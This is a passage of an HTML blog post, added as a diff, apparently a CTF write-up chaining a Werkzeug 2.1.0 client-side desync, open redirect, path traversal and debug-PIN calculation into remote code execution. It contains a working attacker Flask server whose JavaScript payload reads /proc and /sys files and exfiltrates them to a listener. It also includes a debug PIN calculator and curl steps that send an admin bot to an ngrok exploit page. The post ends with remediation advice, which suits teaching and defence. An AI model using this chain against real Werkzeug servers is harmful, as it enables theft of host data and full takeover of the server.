+                <h3>Why This Bypasses Everything</h3>
+
+                <p>The CSD attack sidesteps every defense I had been banging my head against. It bypasses Jinja2
+                    autoescaping because the XSS payload never goes through a template -- it is injected at the HTTP
+                    connection level, before the application even processes the request. It bypasses input validation
+                    because the smuggled request is not subjected to schema validation, JSON parsing, or any application
+                    middleware. And there is no CSP to worry about in the first place.</p>
+
+                <p>The realization hit hard: I was hunting for XSS in the application layer while the real vulnerability
+                    was sitting in the version number of a dependency. This is why reconnaissance of tech stack versions
+                    should come before code auditing.</p>
+
+                <h2 id="s6">6. Building the Exploit</h2>
+
+                <p>With the CSD understood, the full attack chain crystallized:</p>
+
+                <pre><code>CSD -&gt; XSS as admin -&gt; read files via ipc_download -&gt; calculate debug PIN -&gt; /console -&gt; RCE -&gt; flag</code></pre>
+
+                <h3>The Attacker Server</h3>
+
+                <p>I built a Flask server with two routes -- one to serve the CSD exploit page, and one to serve the
+                    JavaScript payload that would execute in the admin's browser.</p>
+
+                <pre><code>from flask import Flask, Response
+app = Flask(__name__)
+
+ATTACKER_URL = "[ATTACKER_URL]"
+EXFIL_URL    = "[LISTENER_URL]"
+
+@app.route("/")
+def payload():
+    """JS payload -- the smuggled response content.
+    After the CSD, the browser receives this as the response to a
+    sub-resource request. It executes in the context of localhost:1337,
+    with the admin's session cookies."""
+    js = """
+    (async () => {
+        async function readFile(path) {
+            try {
+                const r = await fetch('/api/ipc_download?file='
+                    + encodeURIComponent(path));
+                return await r.text();
+            } catch(e) { return 'ERROR: ' + e; }
+        }
+
+        // Read the three files needed for Werkzeug debug PIN
+        const mac     = await readFile('../../../../../../sys/class/net/eth0/address');
+        const boot_id = await readFile('../../../../../../proc/sys/kernel/random/boot_id');
+        const cgroup  = await readFile('../../../../../../proc/self/cgroup');
+
+        // Exfiltrate to listener
+        const loot = btoa(JSON.stringify({mac, boot_id, cgroup}));
+        new Image().src = '%s/loot?data=' + encodeURIComponent(loot);
+    })();
+    """ % EXFIL_URL
+    resp = Response(js)
+    resp.headers["Content-Type"] = "text/plain"
+    return resp
+
+@app.route("/exploit")
+def exploit():
+    """CSD trigger page. The form auto-submits a POST to the target
+    with a smuggled GET request in the body."""
+    return """
+    &lt;form id="x" action="http://localhost:1337/"
+          method="POST" enctype="text/plain"&gt;
+        &lt;textarea name='GET %s HTTP/1.1
+Foo: x'&gt;Exploit&lt;/textarea&gt;
+    &lt;/form&gt;
+    &lt;script&gt;x.submit()&lt;/script&gt;
+    """ % ATTACKER_URL
+
+if __name__ == "__main__":
+    app.run("0.0.0.0", 5000, debug=True)</code></pre>
+
+                <p>The <code>/exploit</code> page is what the bot will land on. The auto-submitting form sends a POST to
+                    <code>http://localhost:1337/</code> -- the target's index route, which accepts POST. The form body
+                    contains a smuggled GET request pointing back to the attacker's server. After the POST
+                    desynchronizes the connection, the browser's next request receives the JS payload as its response.
+                </p>
+
+                <p>The JS payload runs in the admin's browser context on <code>localhost:1337</code>. Since there is no
+                    CSP and the admin is authenticated, it freely calls <code>/api/ipc_download</code> with path
+                    traversal payloads to read system files, then exfiltrates the data via an image beacon. Note:
+                    jQuery's slim build on this app excludes AJAX, but native <code>fetch()</code> works perfectly.</p>
+
+                <h3>Debug PIN Calculator</h3>
+
+                <p>The Werkzeug debug PIN for Python 3.11 in a Docker container is derived from these inputs:</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Input</th>
+                            <th>Value</th>
+                            <th>Source</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Username</td>
+                            <td><code>root</code></td>
+                            <td><code>supervisord.conf</code> runs <code>run.py</code> as <code>user=root</code></td>
+                        </tr>
+                        <tr>
+                            <td>Module name</td>
+                            <td><code>flask.app</code></td>
+                            <td>Constant</td>
+                        </tr>
+                        <tr>
+                            <td>Class name</td>
+                            <td><code>Flask</code></td>
+                            <td>Constant</td>
+                        </tr>
+                        <tr>
+                            <td>Flask path</td>
+                            <td><code>/usr/local/lib/python3.11/site-packages/flask/app.py</code></td>
+                            <td>From <code>python:3.11-alpine</code> Docker image</td>
+                        </tr>
+                        <tr>
+                            <td>MAC address</td>
+                            <td>Read from <code>/sys/class/net/eth0/address</code></td>
+                            <td>Exfiltrated via XSS</td>
+                        </tr>
+                        <tr>
+                            <td>Boot ID + Cgroup</td>
+                            <td>Read from <code>/proc/sys/kernel/random/boot_id</code> + <code>/proc/self/cgroup</code>
+                            </td>
+                            <td>Exfiltrated via XSS</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <pre><code>import hashlib, json, base64
+from itertools import chain
+
+def calc_pin(mac_address, boot_id, cgroup):
+    mac_decimal = str(int(mac_address.strip().replace(":", ""), 16))
+    boot_id = boot_id.strip()
+
+    # Extract cgroup ID (last segment after final /)
+    cgroup_id = cgroup.strip().split("/")[-1] if "/" in cgroup.strip() else cgroup.strip()
+    if cgroup_id.startswith("docker-"):
+        cgroup_id = cgroup_id[7:]
+    if cgroup_id.endswith(".scope"):
+        cgroup_id = cgroup_id[:-6]
+
+    probably_public_bits = [
+        'root', 'flask.app', 'Flask',
+        '/usr/local/lib/python3.11/site-packages/flask/app.py'
+    ]
+    private_bits = [mac_decimal, f'{boot_id}{cgroup_id}']
+
+    # SHA1 method (Werkzeug &gt;= 2.0)
+    h = hashlib.sha1()
+    for bit in chain(probably_public_bits, private_bits):
+        if not bit: continue
+        if isinstance(bit, str): bit = bit.encode('utf-8')
+        h.update(bit)
+    h.update(b'cookiesalt')
+    h.update(b'pinsalt')
+    num = f"{int(h.hexdigest(), 16):09d}"[:9]
+
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            return '-'.join(num[x:x+group_size].rjust(group_size,'0')
+                           for x in range(0, len(num), group_size))
+    return num</code></pre>
+
+                <h2 id="s7">7. Exploitation</h2>
+
+                <h3>Step 1: Register and Login</h3>
+
+                <pre><code>curl -s -X POST http://TARGET:PORT/api/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attacker","password":"password123"}'
+
+curl -s -X POST http://TARGET:PORT/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attacker","password":"password123"}' \
+  -c cookies.txt</code></pre>
+
+                <h3>Step 2: Start the Attacker Server</h3>
+
+                <pre><code># Terminal 1 -- exploit server
+python3 exploit_server.py
+
+# Terminal 2 -- expose it
+ngrok http 5000
+# Note the URL: https://[NGROK_URL].ngrok-free.app
+# Update ATTACKER_URL in exploit_server.py to match</code></pre>
+
+                <h3>Step 3: Trigger the Bot</h3>
+
+                <p>The <code>id</code> parameter in the report is the linchpin. By setting it to a path that traverses
+                    out of <code>/profile/</code> and reaches <code>/go</code>, the admin bot can be redirected to the
+                    exploit page.</p>
+
+                <pre><code>curl -s -X POST http://TARGET:PORT/api/report \
+  -H "Content-Type: application/json" \
+  -b cookies.txt \
+  -d '{"id":"../go?to=https://[NGROK_URL].ngrok-free.app/exploit"}'</code></pre>
+
+                <p>Behind the scenes: the bot logs in as admin, navigates to
+                    <code>http://localhost:1337/profile/../go?to=https://[NGROK_URL]/exploit</code>, the path normalizes
+                    to <code>/go?to=...</code> triggering a 302 redirect to the exploit page, the auto-submitting form
+                    fires the CSD, the browser's next request gets the smuggled response (the JS payload), and the JS
+                    runs in the admin's context to read and exfiltrate the three system files needed for the PIN.</p>
+
+                <h3>Step 4: Collect Exfiltrated Data</h3>
+
+                <p>On the listener dashboard, the incoming request arrives as a base64-encoded JSON blob containing the
+                    MAC address, boot ID, and cgroup data.</p>
+
+                <h3>Step 5: Calculate the Debug PIN</h3>
+
+                <pre><code>python3 pin_calc.py "[BASE64_LOOT_DATA]"
+# Output: Debug PIN: XXX-XXX-XXX</code></pre>
+
+                <h3>Step 6: Access the Debug Console</h3>
+
+                <p>Navigate to <code>http://TARGET:PORT/console</code>, enter the PIN, and you are greeted with an
+                    interactive Python shell.</p>
+
+                <h3>Step 7: Read the Flag</h3>
+
+                <pre><code>&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.listdir('/')
+['bin', 'dev', 'etc', 'flag3a8b7c1d2e.txt', 'home', ...]
+
+&gt;&gt;&gt; os.popen('cat /flag*.txt').read()
+'HTB{REDACTED}\n'</code></pre>
+
+                <p>The wildcard handles the randomized filename.</p>
+
+                <h2 id="s8">8. Attack Chain Summary</h2>
+
+                <pre><code>+----------+-----------------------------------------------------------+
+| Step 1   | Register + Login                                          |
+|          | Create account, get JWT session cookie                    |
++----------+-----------------------------------------------------------+
+| Step 2   | Set Up Attacker Server                                    |
+|          | Flask server with /exploit (CSD trigger) and / (payload) |
+|          | Expose via ngrok or VPN IP                                |
++----------+-----------------------------------------------------------+
+| Step 3   | Trigger Bot via Report                                    |
+|          | id = "../go?to=https://attacker/exploit"                  |
+|          | Path traversal + open redirect -&gt; bot on attacker page   |
++----------+-----------------------------------------------------------+
+| Step 4   | Client-Side Desync -&gt; XSS                                 |
+|          | Auto-submitting form POSTs to localhost:1337              |
+|          | Smuggled GET left in TCP buffer                           |
+|          | Browser's next request gets smuggled response             |
+|          | JS payload executes in admin context on localhost:1337    |
++----------+-----------------------------------------------------------+
+| Step 5   | File Exfiltration via ipc_download Path Traversal         |
+|          | XSS reads: /sys/class/net/eth0/address (MAC)             |
+|          |            /proc/sys/kernel/random/boot_id               |
+|          |            /proc/self/cgroup                              |
+|          | Data exfiltrated via Image beacon to listener             |
++----------+-----------------------------------------------------------+
+| Step 6   | Calculate Werkzeug Debug PIN                              |
+|          | SHA1(public_bits + private_bits + salts)                  |
+|          | public: root, flask.app, Flask, flask/app.py path        |
+|          | private: MAC decimal + boot_id + cgroup_id               |
++----------+-----------------------------------------------------------+
+| Step 7   | Debug Console RCE -&gt; Flag                                 |
+|          | Navigate to /console, enter PIN                           |
+|          | os.popen('cat /flag*.txt').read()                         |
++----------+-----------------------------------------------------------+</code></pre>
+
+                <h2 id="s9">9. Why Other Approaches Failed</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Technique</th>
+                            <th>Why It Failed</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Stored XSS via <code>bots</code> field</td>
+                            <td>Jinja2 autoescaping encodes all special characters in the <code>data-bot-exp</code>
+                                attribute. The decoded value is used only for <code>String.includes()</code> substring
+                                checks and never reaches any HTML rendering sink.</td>
+                        </tr>
+                        <tr>
+                            <td>DOM XSS via <code>.html()</code></td>
+                            <td>The jQuery <code>.html()</code> call only renders content from the hardcoded
+                                <code>botsData</code> array in <code>global.js</code>. No user input is interpolated
+                                into the <code>botsHTML</code> string. The sink exists, but no attacker-controlled
+                                source connects to it.</td>
+                        </tr>
+                        <tr>
+                            <td>Splitting payloads across array items</td>
+                            <td>The schema validates each item (<code>maxLength: 10</code>), and f-string conversion
+                                concatenates them into one string. But the concatenated string still lives in a data
+                                attribute (autoescaped) and still never flows to <code>.html()</code>.</td>
+                        </tr>
+                        <tr>
+                            <td>Attribute breakout injection</td>
+                            <td>Autoescaping converts <code>"</code> to <code>&amp;#34;</code> and <code>&gt;</code> to
+                                <code>&amp;gt;</code>, preventing any breakout from the <code>data-bot-exp=""</code>
+                                attribute.</td>
+                        </tr>
+                        <tr>
+                            <td>XSS via <code>bio</code> field</td>
+                            <td>Rendered with explicit <code>{{ user.bio | e }}</code> escaping. Even without it,
+                                autoescaping would apply.</td>
+                        </tr>
+                        <tr>
+                            <td>XSS via <code>full_name</code>, <code>iexp</code></td>
+                            <td>All autoescaped. <code>qualification</code> is additionally constrained to an enum of
+                                three values.</td>
+                        </tr>
+                        <tr>
+                            <td>SSTI via Jinja2</td>
+                            <td>User data is passed as template variables, not template strings.
+                                <code>{{ config.SECRET_KEY }}</code> in a field renders as literal text, not evaluated.
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>SQL Injection</td>
+                            <td>All queries in <code>database.py</code> use parameterized statements (<code>%s</code>
+                                placeholders).</td>
+                        </tr>
+                        <tr>
+                            <td>JWT Forgery</td>
+                            <td>Secret key is <code>os.urandom(50).hex()</code> -- 100 hex characters of cryptographic
+                                randomness.</td>
+                        </tr>
+                        <tr>
+                            <td>Direct path traversal</td>
+                            <td><code>/api/ipc_download</code> requires admin authentication. Without the CSD chain, the
+                                endpoint returns <code>Unauthorized</code>.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2 id="s10">10. Key Takeaways</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Concept</th>
+                            <th>Lesson</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Check dependency versions first</td>
+                            <td><code>Werkzeug==2.1.0</code> pinned in <code>requirements.txt</code> was the single most
+                                important clue. In CTFs, pinned dependency versions are deliberate signals -- research
+                                them before diving into source code.</td>
+                        </tr>
+                        <tr>
+                            <td>Client-Side Desync</td>
+                            <td>CSD is an infrastructure-level vulnerability in the web server itself. No amount of
+                                input sanitization, template escaping, or schema validation can prevent it. It operates
+                                below the application layer, at the HTTP connection level.</td>
+                        </tr>
+                        <tr>
+                            <td><code>debug=True</code> is RCE</td>
+                            <td>Werkzeug's debug mode exposes an interactive Python console at <code>/console</code>.
+                                Even with PIN protection, the PIN is deterministically derived from system values that
+                                can be leaked through file read vulnerabilities. Never run Flask with
+                                <code>debug=True</code> in production.</td>
+                        </tr>
+                        <tr>
+                            <td>Chaining is everything</td>
+                            <td>No single vulnerability here is exploitable in isolation. The chain is: CSD (XSS), open
+                                redirect (delivery), unvalidated bot ID (path traversal to redirect), ipc_download path
+                                traversal (file read), debug console (RCE). Five vulnerabilities, one kill chain.</td>
+                        </tr>
+                        <tr>
+                            <td>The <code>.html()</code> trap</td>
+                            <td><code>.html()</code> IS a DOM XSS sink -- but only if attacker-controlled data reaches
+                                it. Always trace the full data flow from source to sink, not just identify sinks in
+                                isolation. A sink without a connected source is just code.</td>
+                        </tr>
+                        <tr>
+                            <td>Red herrings are features</td>
+                            <td>The bots field, the f-string conversion, the <code>includes()</code> substring check,
+                                the <code>.html()</code> call -- these all look vulnerable when examined individually.
+                                The challenge is designed to pull you into this rabbit hole. The actual vulnerability is
+                                hidden in a version number.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2 id="s11">11. Remediation</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Vulnerability</th>
+                            <th>Fix</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Client-Side Desync</td>
+                            <td>Upgrade Werkzeug to version 2.1.1 or later where the CSD vulnerability is patched. Use a
+                                production WSGI server (Gunicorn, uWSGI) instead of Werkzeug's development server.</td>
+                        </tr>
+                        <tr>
+                            <td>Debug mode enabled</td>
+                            <td>Remove <code>debug=True</code> from <code>app.run()</code>. Never enable debug mode
+                                outside local development.</td>
+                        </tr>
+                        <tr>
+                            <td>Open redirect</td>
+                            <td>Validate the <code>to</code> parameter against an allowlist of trusted domains. At
+                                minimum, reject non-HTTPS schemes and external domains.</td>
+                        </tr>
+                        <tr>
+                            <td>Unvalidated bot ID</td>
+                            <td>Enforce numeric-only validation: <code>if not user_id.isdigit(): return error</code>.
+                                This prevents path traversal in the bot URL construction.</td>
+                        </tr>
+                        <tr>
+                            <td>Path traversal in ipc_download</td>
+                            <td>Use <code>os.path.basename()</code> to strip directory components, or use
+                                <code>werkzeug.utils.secure_filename()</code>.</td>
+                        </tr>
+                        <tr>
+                            <td>Missing CSP</td>
+                            <td>Add a strict Content-Security-Policy:
+                                <code>default-src 'self'; script-src 'nonce-[random]'</code>. While this would not
+                                prevent CSD, it raises the bar significantly for exploitation.</td>
+                        </tr>
+                        <tr>
+                            <td>HttpOnly cookies</td>
+                            <td>Flask's session cookies are HttpOnly by default, which is correct. Explicitly setting
+                                <code>SESSION_COOKIE_HTTPONLY = True</code> guards against accidental regression.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="pwned-banner">
+                    <span class="pwned-icon">🏴</span>
+                    <div class="pwned-text">Machine Pwned</div>
+                    <p class="pwned-sub">Client-Side Desync (Werkzeug 2.1.0) + Open Redirect + Path Traversal + Debug
+                        PIN Calculation + RCE via /console</p>
+                </div>
+
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 Abdelaaziz Belkhair</p>
+        </div>
+    </footer>
+</body>
+
+</html>
